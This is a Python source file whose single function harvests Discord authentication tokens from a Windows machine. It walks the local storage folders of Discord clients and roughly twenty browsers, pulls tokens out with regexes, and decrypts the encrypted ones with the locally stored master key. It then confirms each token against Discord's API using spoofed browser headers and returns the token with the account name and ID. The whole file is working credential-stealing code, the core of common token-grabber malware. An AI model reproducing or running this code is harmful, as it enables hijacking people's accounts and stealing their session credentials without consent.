# -*- coding: utf-8 -*-
# Copyright (C) 2021 github.com/ItsChasa
#
# This source code has been released under the GNU Affero General Public
# License v3.0. A copy of this license is available at
# https://www.gnu.org/licenses/agpl-3.0.en.html

import os, re, requests, base64, json
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

def fetch():
    """[[token, user#tag], ...] """
    
    regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
    encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*"
    
    def decrypt_stuff(buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_stuff = cipher.decrypt(payload)
            decrypted_stuff = decrypted_stuff[:-16].decode()
            
            return decrypted_stuff
        except Exception:
            pass
    
    def get_decryption_key(path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            temp = f.read()
        local = json.loads(temp)
        decryption_key = base64.b64decode(local["os_crypt"]["encrypted_key"])
        decryption_key = decryption_key[5:]
        decryption_key = CryptUnprotectData(decryption_key, None, None, None, 0)[1]
        
        return decryption_key
    
    def getheaders(token):
        headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "authorization": token,
            "cookie": "locale=en-GB",
            "referer": "https://discord.com/channels/@me",
            "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
            "x-debug-options": "bugReporterEnabled",
            "x-discord-locale": "en-GB",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMC4wLjQ4OTYuMTI3IFNhZmFyaS81MzcuMzYiLCJicm93c2VyX3ZlcnNpb24iOiIxMDAuMC40ODk2LjEyNyIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiIiwicmVmZXJyaW5nX2RvbWFpbiI6IiIsInJlZmVycmVyX2N1cnJlbnQiOiIiLCJyZWZlcnJpbmdfZG9tYWluX2N1cnJlbnQiOiIiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfYnVpbGRfbnVtYmVyIjoxMjY0NjIsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        return headers
    
    to_return_tokens = []
    ids = []

    roaming = os.getenv("appdata")
    localappdata = os.getenv("localappdata")

    paths = {
        'Discord': roaming + r'\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + r'\\discordptb\\Local Storage\\leveldb\\',
        'Opera': roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': localappdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': localappdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': localappdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': localappdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': localappdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': localappdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': localappdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': localappdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': localappdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': localappdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': localappdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': localappdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': localappdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': localappdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': localappdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': localappdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
    }
    for name, path in paths.items():
        if not os.path.exists(path):
            continue
        disc = name.replace(" ", "").lower()
        if "cord" in path:
            if os.path.exists(roaming+f'\\{disc}\\Local State'):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(encrypted_regex, line):
                            try:
                                token = decrypt_stuff(base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), get_decryption_key(roaming+f'\\{disc}\\Local State'))
                            except: pass
                            else:
                                r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                                if r.status_code == 200:
                                    tknid = r.json()["id"]
                                    if tknid not in ids:
                                        to_return_tokens.append([token, f"{r.json()['username']}#{r.json()['discriminator']}", tknid])
                                        ids.append(tknid)
        else:
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for reg in (regex):
                        for token in re.findall(reg, line):
                            r = requests.get("https://discord.com/api/v9/users/@me", headers=getheaders(token))
                            if r.status_code == 200:
                                tknid = r.json()["id"]
                                if tknid not in ids:
                                    to_return_tokens.append([token, f"{r.json()['username']}#{r.json()['discriminator']}", tknid])
                                    ids.append(tknid)
                
    return to_return_tokens